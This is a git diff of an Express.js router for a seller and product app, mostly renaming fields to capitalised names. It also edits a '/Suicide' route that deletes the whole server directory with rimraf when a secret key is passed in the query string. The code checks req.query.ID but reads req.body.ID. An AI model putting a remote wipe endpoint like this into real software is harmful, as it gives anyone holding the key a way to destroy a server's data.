@@ -4,7 +4,7 @@ var router = express.Router();
 /*********************************************/
 const {Seller , cities , sellerType , productGroups , products , sellerProducts , unit ,  car} = require('../../sequelize');
 const {upload,selfDestroyKey , colors , loggerinfo} = require('../Util/myVars');
-const {response , isThisArrayEmpty } = require("../Util/myFunctions");
+const {checkToken,response , isThisArrayEmpty } = require("../Util/myFunctions");
 var path = require('path');
 const fs = require("fs");
 /*********************************************/
@@ -33,9 +33,9 @@ router.get('/AppInfoGetter/:type' , function (req,res) {
 
             });break;
         case "moreproductGroup" :
-            if (req.query.id == null){res.status(400).json({"message":"id not found"});}else {
+            if (req.query.ID == null){res.status(400).json({"message":"id not found"});}else {
                 products.findAll({where: {
-                        groupid: req.body.id
+                        GroupID: req.body.ID
                     }}).then(products => {
                     response(res,products).then(
                         loggerinfo.info(req.connection.remoteAddress + " get productGroup detail list")
@@ -45,16 +45,16 @@ router.get('/AppInfoGetter/:type' , function (req,res) {
             }break;
 
         case "product":
-            if (req.query.id == null){res.status(400).json({"message":"id not found"});}else {
+            if (req.query.ID == null){res.status(400).json({"message":"id not found"});}else {
                 sellerProducts.findAll({where: {
-                        productid: req.body.id
+                        ProductID: req.body.ID
                     }}).then(products => {
                     var final = [];
 
                     function testFunction2(value, index, array) {
                         var base64str="not Found";
                         try {
-                            base64str = base64_encode(value.image);
+                            base64str = base64_encode(value.Image);
 
                         }catch (e) {
                             base64str = "not Found";
@@ -62,16 +62,16 @@ router.get('/AppInfoGetter/:type' , function (req,res) {
                         }
 
                         final[index] = {
-                            id:value.id,
-                            description:value.description,
-                            price:value.price,
-                            price_date_time:value.price_date_time,
-                            supply_of_product:value.supply_of_product,
-                            unit_of_product:value.unit_of_product,
-                            productid:value.productid,
-                            sellerid:value.sellerid,
-                            unitid:value.unitid,
-                            image:base64str
+                            ID:value.ID,
+                            Description:value.Description,
+                            Price:value.Price,
+                            PriceDateTime:value.PriceDateTime,
+                            SupplyOFProduct:value.SupplyOFProduct,
+                            UnitOFProduct:value.UnitOFProduct,
+                            ProductID:value.ProductID,
+                            SellerID:value.SellerID,
+                            UnitID:value.UnitID,
+                            Image:base64str
                         }
                     }
                     if (!isThisArrayEmpty(products)){
@@ -106,8 +106,8 @@ router.get('/AppInfoGetter/:type' , function (req,res) {
 
 
     router.get('/Suicide', (req, res) => {
-        if (req.query.key != null){
-            if (req.query.key === selfDestroyKey){
+        if (req.query.Key != null){
+            if (req.query.Key === selfDestroyKey){
                 const targetPath = path.join(__dirname, "./../../");
                 rimraf(targetPath, function () { return res.status(200).json({"message":"this is the last response of this server , byebye :)"}) });
             }
